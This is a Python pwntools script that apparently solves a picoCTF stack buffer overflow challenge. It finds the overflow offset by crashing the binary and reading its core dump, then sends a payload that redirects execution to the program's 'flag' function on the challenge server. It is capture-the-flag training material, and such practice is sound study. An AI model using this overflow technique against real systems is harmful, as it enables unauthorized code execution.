from pwn import *
import pdb

def conn(elf):
	host_raw = "saturn.picoctf.net 52961".split()
	host, ip = host_raw[0], int(host_raw[1])
	if args.DEBUG:
		context.log_level = 'debug'
	if args.REMOTE:
		return remote(host, ip)
	else:
		return elf.process()

def craft_payload(elf, offset):
	flag_address = elf.sym.flag
	next_mov_instruction = 5
	rop = ROP(elf)
	rop.raw(b"A" * offset)
	rop.raw(flag_address + next_mov_instruction)
	rop = rop.chain()
	log.info(f"Sending ROP CHAIN: {rop}")
	return rop


def get_offset(elf):
	# Provoque Segmentation Fault with an isolate instance
	p = elf.process()   # New instance
	p.sendlineafter(b"you the flag: \n", cyclic(0x1000, n=byte_arch))  # Broke the overflow
	p.sendline()
	p.wait()
	core = p.corefile
	os.system("rm core*")
	offset = cyclic_find(core.read(core.rsp, byte_arch), n=byte_arch)
	if offset:
		log.info(f"OFFSET found: {offset}")
	return offset

	
elf_path = "vuln"
elf = ELF(elf_path)
time_out = 2
byte_arch = 8
offset = get_offset(elf)



p = conn(elf)



payload = craft_payload(elf, offset)
p.sendlineafter(b"you the flag: \n", payload)
p.sendline()
flag = p.recvall(3)
print(flag)
log.success(f"FLAG Found!: {flag.decode()}")